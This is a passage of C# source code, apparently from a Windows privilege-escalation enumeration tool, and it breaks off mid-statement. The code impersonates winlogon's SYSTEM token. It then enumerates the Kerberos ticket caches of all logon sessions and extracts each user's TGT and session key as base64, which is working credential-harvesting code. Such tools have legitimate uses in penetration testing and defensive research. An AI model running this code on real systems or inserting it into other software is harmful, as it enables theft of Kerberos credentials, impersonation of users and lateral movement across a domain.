        [DllImport("Secur32.dll", SetLastError = false)]
        private static extern uint LsaGetLogonSessionData(IntPtr luid, out IntPtr ppLogonSessionData);

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle, [In] ref LSA_STRING_IN PackageName, [Out] out int AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, int AuthenticationPackage, ref KERB_QUERY_TKT_CACHE_REQUEST ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern uint LsaFreeReturnBuffer(IntPtr buffer);
        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);

        [DllImport("secur32.dll", EntryPoint = "LsaCallAuthenticationPackage", SetLastError = false)]
        private static extern int LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(IntPtr LsaHandle, int AuthenticationPackage, ref KERB_RETRIEVE_TKT_REQUEST ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);


        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_IN
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public string Buffer;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_OUT
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        [StructLayout(LayoutKind.Sequential)]
        protected struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_LOGON_SESSION_DATA
        {
            public UInt32 Size;
            public LUID LoginID;
            public LSA_STRING_OUT Username;
            public LSA_STRING_OUT LoginDomain;
            public LSA_STRING_OUT AuthenticationPackage;
            public UInt32 LogonType;
            public UInt32 Session;
            public IntPtr PSiD;
            public UInt64 LoginTime;
            public LSA_STRING_OUT LogonServer;
            public LSA_STRING_OUT DnsDomainName;
            public LSA_STRING_OUT Upn;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
        }
        public enum KERB_PROTOCOL_MESSAGE_TYPE : UInt32
        {
            KerbDebugRequestMessage = 0,
            KerbQueryTicketCacheMessage = 1,
            KerbChangeMachinePasswordMessage = 2,
            KerbVerifyPacMessage = 3,
            KerbRetrieveTicketMessage = 4,
            KerbUpdateAddressesMessage = 5,
            KerbPurgeTicketCacheMessage = 6,
            KerbChangePasswordMessage = 7,
            KerbRetrieveEncodedTicketMessage = 8,
            KerbDecryptDataMessage = 9,
            KerbAddBindingCacheEntryMessage = 10,
            KerbSetPasswordMessage = 11,
            KerbSetPasswordExMessage = 12,
            KerbVerifyCredentialsMessage = 13,
            KerbQueryTicketCacheExMessage = 14,
            KerbPurgeTicketCacheExMessage = 15,
            KerbRefreshSmartcardCredentialsMessage = 16,
            KerbAddExtraCredentialsMessage = 17,
            KerbQuerySupplementalCredentialsMessage = 18,
            KerbTransferCredentialsMessage = 19,
            KerbQueryTicketCacheEx2Message = 20,
            KerbSubmitTicketMessage = 21,
            KerbAddExtraCredentialsExMessage = 22,
            KerbQueryKdcProxyCacheMessage = 23,
            KerbPurgeKdcProxyCacheMessage = 24,
            KerbQueryTicketCacheEx3Message = 25,
            KerbCleanupMachinePkinitCredsMessage = 26,
            KerbAddBindingCacheEntryExMessage = 27,
            KerbQueryBindingCacheMessage = 28,
            KerbPurgeBindingCacheMessage = 29,
            KerbQueryDomainExtendedPoliciesMessage = 30,
            KerbQueryS4U2ProxyCacheMessage = 31
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public int CountOfTickets;
            // public KERB_TICKET_CACHE_INFO[] Tickets;
            public IntPtr Tickets;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_TICKET_CACHE_INFO
        {
            public LSA_STRING_OUT ServerName;
            public LSA_STRING_OUT RealmName;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewTime;
            public Int32 EncryptionType;
            public UInt32 TicketFlags;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CRYPTO_KEY
        {
            public Int32 KeyType;
            public Int32 Length;
            public IntPtr Value;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_STRING_OUT DomainName;
            public LSA_STRING_OUT TargetDomainName;
            public LSA_STRING_OUT AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public UInt32 TicketFlags;
            public UInt32 Flags;
            public Int64 KeyExpirationTime;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewUntil;
            public Int64 TimeSkew;
            public Int32 EncodedTicketSize;
            public IntPtr EncodedTicket;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_RETRIEVE_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public LSA_STRING_IN TargetName;
            public UInt64 TicketFlags;
            public KERB_CACHE_OPTIONS CacheOptions;
            public Int64 EncryptionType;
            public SECURITY_HANDLE CredentialsHandle;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
            public SECURITY_HANDLE(int dummy)
            {
                LowPart = HighPart = IntPtr.Zero;
            }
        };
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_EXTERNAL_NAME
        {
            public Int16 NameType;
            public UInt16 NameCount;
            public LSA_STRING_OUT Names;
        }
        [Flags]
        private enum KERB_CACHE_OPTIONS : UInt64
        {
            KERB_RETRIEVE_TICKET_DEFAULT = 0x0,
            KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 0x1,
            KERB_RETRIEVE_TICKET_USE_CACHE_ONLY = 0x2,
            KERB_RETRIEVE_TICKET_USE_CREDHANDLE = 0x4,
            KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8,
            KERB_RETRIEVE_TICKET_WITH_SEC_CRED = 0x10,
            KERB_RETRIEVE_TICKET_CACHE_TICKET = 0x20,
            KERB_RETRIEVE_TICKET_MAX_LIFETIME = 0x40,
        }

        private enum SECURITY_LOGON_TYPE : uint
        {
            Interactive = 2,        // logging on interactively.
            Network,                // logging using a network.
            Batch,                  // logon for a batch process.
            Service,                // logon for a service account.
            Proxy,                  // Not supported.
            Unlock,                 // Tattempt to unlock a workstation.
            NetworkCleartext,       // network logon with cleartext credentials
            NewCredentials,         // caller can clone its current token and specify new credentials for outbound connections
            RemoteInteractive,      // terminal server session that is both remote and interactive
            CachedInteractive,      // attempt to use the cached credentials without going out across the network
            CachedRemoteInteractive,// same as RemoteInteractive, except used internally for auditing purposes
            CachedUnlock            // attempt to unlock a workstation
        }
        public enum KERB_ENCRYPTION_TYPE : UInt32
        {
            reserved0 = 0,
            des_cbc_crc = 1,
            des_cbc_md4 = 2,
            des_cbc_md5 = 3,
            reserved1 = 4,
            des3_cbc_md5 = 5,
            reserved2 = 6,
            des3_cbc_sha1 = 7,
            dsaWithSHA1_CmsOID = 9,
            md5WithRSAEncryption_CmsOID = 10,
            sha1WithRSAEncryption_CmsOID = 11,
            rc2CBC_EnvOID = 12,
            rsaEncryption_EnvOID = 13,
            rsaES_OAEP_ENV_OID = 14,
            des_ede3_cbc_Env_OID = 15,
            des3_cbc_sha1_kd = 16,
            aes128_cts_hmac_sha1_96 = 17,
            aes256_cts_hmac_sha1_96 = 18,
            aes128_cts_hmac_sha256_128 = 19,
            aes256_cts_hmac_sha384_192 = 20,
            rc4_hmac = 23,
            rc4_hmac_exp = 24,
            camellia128_cts_cmac = 25,
            camellia256_cts_cmac = 26,
            subkey_keymaterial = 65
        }
        [Flags]
        public enum KERB_TICKET_FLAGS : UInt32
        {
            reserved = 2147483648,
            forwardable = 0x40000000,
            forwarded = 0x20000000,
            proxiable = 0x10000000,
            proxy = 0x08000000,
            may_postdate = 0x04000000,
            postdated = 0x02000000,
            invalid = 0x01000000,
            renewable = 0x00800000,
            initial = 0x00400000,
            pre_authent = 0x00200000,
            hw_authent = 0x00100000,
            ok_as_delegate = 0x00040000,
            name_canonicalize = 0x00010000,
            //cname_in_pa_data = 0x00040000,
            enc_pa_rep = 0x00010000,
            reserved1 = 0x00000001
        }
        public static IntPtr LsaRegisterLogonProcessHelper()
        {
            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
            //  used for Kerberos ticket enumeration

            string logonProcessName = "User32LogonProcesss";
            LSA_STRING_IN LSAString;
            IntPtr lsaHandle = IntPtr.Zero;
            UInt64 securityMode = 0;

            LSAString.Length = (ushort)logonProcessName.Length;
            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
            LSAString.Buffer = logonProcessName;

            int ret = LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);

            return lsaHandle;
        }

        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation

            if (MyUtils.IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                bool success = OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    //Console.WriteLine("OpenProcessToken failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                IntPtr hDupToken = IntPtr.Zero;
                success = DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    //Console.WriteLine("DuplicateToken failed!");
                    return false;
                }

                success = ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                CloseHandle(hToken);
                CloseHandle(hDupToken);

                string name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (name != "NT AUTHORITY\\SYSTEM")
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }

        public static List<Dictionary<string, string>> ListKerberosTickets()
        {
            if (MyUtils.IsHighIntegrity())
            {
                return ListKerberosTicketsAllUsers();
            }
            else
            {
                return ListKerberosTicketsCurrentUser();
            }
        }

        public static List<Dictionary<string, string>> ListKerberosTicketsAllUsers()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            IntPtr hLsa = LsaRegisterLogonProcessHelper();
            int totalTicketCount = 0;

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (hLsa == IntPtr.Zero)
            {
                GetSystem();
                // should now have the proper privileges to get a Handle to LSA
                hLsa = LsaRegisterLogonProcessHelper();
                // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                RevertToSelf();
            }

            try
            {
                // first return all the logon sessions

                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = LsaGetLogonSessionData(luidPtr, out sessionData);
                    SECURITY_LOGON_SESSION_DATA data = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        SECURITY_LOGON_TYPE logonType = (SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        // now we want to get the tickets for this logon ID
                        string name = "kerberos";
                        LSA_STRING_IN LSAString;
                        LSAString.Length = (ushort)name.Length;
                        LSAString.MaximumLength = (ushort)(name.Length + 1);
                        LSAString.Buffer = name;

                        IntPtr ticketPointer = IntPtr.Zero;
                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
                        int authPack;
                        int returnBufferLength = 0;
                        int protocalStatus = 0;
                        int retCode;

                        KERB_QUERY_TKT_CACHE_REQUEST tQuery = new KERB_QUERY_TKT_CACHE_REQUEST();
                        KERB_QUERY_TKT_CACHE_RESPONSE tickets = new KERB_QUERY_TKT_CACHE_RESPONSE();
                        KERB_TICKET_CACHE_INFO ticket;

                        // obtains the unique identifier for the kerberos authentication package.
                        retCode = LsaLookupAuthenticationPackage(hLsa, ref LSAString, out authPack);

                        // input object for querying the ticket cache for a specific logon ID
                        LUID userLogonID = new LUID();
                        userLogonID.LowPart = data.LoginID.LowPart;
                        userLogonID.HighPart = 0;
                        tQuery.LogonId = userLogonID;
                        tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                        // query LSA, specifying we want the ticket cache
                        retCode = LsaCallAuthenticationPackage(hLsa, authPack, ref tQuery, Marshal.SizeOf(tQuery), out ticketPointer, out returnBufferLength, out protocalStatus);

                        /*Console.WriteLine("\r\n  UserName                 : {0}", username);
                        Console.WriteLine("  Domain                   : {0}", domain);
                        Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                        Console.WriteLine("  UserSID                  : {0}", sid.AccountDomainSid);
                        Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                        Console.WriteLine("  LogonType                : {0}", logonType);
                        Console.WriteLine("  LogonType                : {0}", logonTime);
                        Console.WriteLine("  LogonServer              : {0}", logonServer);
                        Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                        Console.WriteLine("  UserPrincipalName        : {0}\r\n", upn);*/

                        if (ticketPointer != IntPtr.Zero)
                        {
                            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                            tickets = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                            int count2 = tickets.CountOfTickets;

                            if (count2 != 0)
                            {
                                Console.WriteLine("    [*] Enumerated {0} ticket(s):\r\n", count2);
                                totalTicketCount += count2;
                                // get the size of the structures we're iterating over
                                Int32 dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));

                                for (int j = 0; j < count2; j++)
                                {
                                    // iterate through the structures
                                    IntPtr currTicketPtr = (IntPtr)(long)((ticketPointer.ToInt64() + (int)(8 + j * dataSize)));

                                    // parse the new ptr to the appropriate structure
                                    ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(KERB_TICKET_CACHE_INFO));

                                    // extract our fields
                                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length / 2);
                                    DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                                    DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                                    DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
                                    string encryptionType = ((KERB_ENCRYPTION_TYPE)ticket.EncryptionType).ToString();
                                    string ticketFlags = ((KERB_TICKET_FLAGS)ticket.TicketFlags).ToString();

                                    results.Add(new Dictionary<string, string>()
                                    {
                                        { "UserPrincipalName", upn },
                                        { "serverName", serverName },
                                        { "RealmName", realmName },
                                        { "StartTime", String.Format("{0}", startTime) },
                                        { "EndTime", String.Format("{0}", endTime) },
                                        { "RenewTime", String.Format("{0}", renewTime) },
                                        { "EncryptionType", encryptionType },
                                        { "TicketFlags", ticketFlags },
                                    });
                                }
                            }
                        }
                    }
                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                    LsaFreeReturnBuffer(sessionData);
                }
                LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                LsaDeregisterLogonProcess(hLsa);
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }

        public static List<Dictionary<string, string>> ListKerberosTicketsCurrentUser()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            try
            {
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                IntPtr ticketPointer = IntPtr.Zero;
                IntPtr ticketsPointer = IntPtr.Zero;
                DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
                int authPack;
                int returnBufferLength = 0;
                int protocalStatus = 0;
                IntPtr lsaHandle;
                int retCode;

                // If we want to look at tickets from a session other than our own
                // then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
                retCode = LsaConnectUntrusted(out lsaHandle);

                KERB_QUERY_TKT_CACHE_REQUEST tQuery = new KERB_QUERY_TKT_CACHE_REQUEST();
                KERB_QUERY_TKT_CACHE_RESPONSE tickets = new KERB_QUERY_TKT_CACHE_RESPONSE();
                KERB_TICKET_CACHE_INFO ticket;

                // obtains the unique identifier for the kerberos authentication package.
                retCode = LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
                tQuery.LogonId = new LUID();
                tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                // query LSA, specifying we want the ticket cache
                retCode = LsaCallAuthenticationPackage(lsaHandle, authPack, ref tQuery, Marshal.SizeOf(tQuery), out ticketPointer, out returnBufferLength, out protocalStatus);

                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                tickets = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                int count = tickets.CountOfTickets;

                // get the size of the structures we're iterating over
                Int32 dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));

                for (int i = 0; i < count; i++)
                {
                    // iterate through the structures
                    IntPtr currTicketPtr = (IntPtr)(long)((ticketPointer.ToInt64() + (int)(8 + i * dataSize)));

                    // parse the new ptr to the appropriate structure
                    ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(KERB_TICKET_CACHE_INFO));

                    // extract our fields
                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length / 2);
                    DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                    DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                    DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
                    string encryptionType = ((KERB_ENCRYPTION_TYPE)ticket.EncryptionType).ToString();
                    string ticketFlags = ((KERB_TICKET_FLAGS)ticket.TicketFlags).ToString();

                    results.Add(new Dictionary<string, string>()
                                    {
                                        { "serverName", serverName },
                                        { "RealmName", realmName },
                                        { "StartTime", String.Format("{0}", startTime) },
                                        { "EndTime", String.Format("{0}", endTime) },
                                        { "RenewTime", String.Format("{0}", renewTime) },
                                        { "EncryptionType", encryptionType },
                                        { "TicketFlags", ticketFlags },
                                    });
                }

                // disconnect from LSA
                LsaDeregisterLogonProcess(lsaHandle);
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }

        public static List<Dictionary<string, string>> GetKerberosTGTData()
        {
            if (MyUtils.IsHighIntegrity())
            {
                return ListKerberosTGTDataAllUsers();
            }
            else
            {
                return ListKerberosTGTDataCurrentUser();
            }
        }

        public static List<Dictionary<string, string>> ListKerberosTGTDataAllUsers()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            IntPtr hLsa = LsaRegisterLogonProcessHelper();
            int totalTicketCount = 0;

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (hLsa == IntPtr.Zero)
            {
                GetSystem();
                // should now have the proper privileges to get a Handle to LSA
                hLsa = LsaRegisterLogonProcessHelper();
                // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                RevertToSelf();
            }

            try
            {
                // first return all the logon sessions

                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = LsaGetLogonSessionData(luidPtr, out sessionData);
                    SECURITY_LOGON_SESSION_DATA data = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        SECURITY_LOGON_TYPE logonType = (SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        // now we want to get the tickets for this logon ID
                        string name = "kerberos";
                        LSA_STRING_IN LSAString;
                        LSAString.Length = (ushort)name.Length;
                        LSAString.MaximumLength = (ushort)(name.Length + 1);
                        LSAString.Buffer = name;

                        IntPtr responsePointer = IntPtr.Zero;
                        int authPack;
                        int returnBufferLength = 0;
                        int protocalStatus = 0;
                        int retCode;

                        KERB_RETRIEVE_TKT_REQUEST tQuery = new KERB_RETRIEVE_TKT_REQUEST();
                        KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();

                        // obtains the unique identifier for the kerberos authentication package.
                        retCode = LsaLookupAuthenticationPackage(hLsa, ref LSAString, out authPack);

                        // input object for querying the TGT for a specific logon ID (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request)
                        LUID userLogonID = new LUID();
                        userLogonID.LowPart = data.LoginID.LowPart;
                        userLogonID.HighPart = 0;
                        tQuery.LogonId = userLogonID;
                        tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage;
                        // indicate we want kerb creds yo'
                        tQuery.CacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED;

                        // query LSA, specifying we want the the TGT data
                        retCode = LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(hLsa, authPack, ref tQuery, Marshal.SizeOf(tQuery), out responsePointer, out returnBufferLength, out protocalStatus);

                        if ((retCode) == 0 && (responsePointer != IntPtr.Zero))
                        {
                            /*Console.WriteLine("\r\n  UserName                 : {0}", username);
                            Console.WriteLine("  Domain                   : {0}", domain);
                            Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                            Console.WriteLine("  UserSID                  : {0}", sid.AccountDomainSid);
                            Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                            Console.WriteLine("  LogonType                : {0}", logonType);
                            Console.WriteLine("  LogonType                : {0}", logonTime);
                            Console.WriteLine("  LogonServer              : {0}", logonServer);
                            Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                            Console.WriteLine("  UserPrincipalName        : {0}", upn);*/

                            // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                            response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));

                            KERB_EXTERNAL_NAME serviceNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(KERB_EXTERNAL_NAME));
                            string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                            string targetName = "";
                            if (response.Ticket.TargetName != IntPtr.Zero)
                            {
                                KERB_EXTERNAL_NAME targetNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(KERB_EXTERNAL_NAME));
                                targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                            }

                            KERB_EXTERNAL_NAME clientNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(KERB_EXTERNAL_NAME));
                            string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                            string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                            string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                            string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                            // extract the session key
                            KERB_ENCRYPTION_TYPE sessionKeyType = (KERB_ENCRYPTION_TYPE)response.Ticket.SessionKey.KeyType;
                            Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                            byte[] sessionKey = new byte[sessionKeyLength];
                            Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                            string base64SessionKey = Convert.ToBase64String(sessionKey);

                            DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                            DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                            DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                            DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                            Int64 timeSkew = response.Ticket.TimeSkew;
                            Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                            string ticketFlags = ((KERB_TICKET_FLAGS)response.Ticket.TicketFlags).ToString();

                            // extract the TGT and base64 encode it
                            byte[] encodedTicket = new byte[encodedTicketSize];
                            Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                            string base64TGT = Convert.ToBase64String(encodedTicket);

                            results.Add(new Dictionary<string, string>()
                            {
                                { "UserPrincipalName", upn },
                                { "ServiceName", serviceName },
                                { "TargetName", targetName },
                                { "ClientName", clientName },
                                { "DomainName", domainName },
                                { "TargetDomainName", targetDomainName },
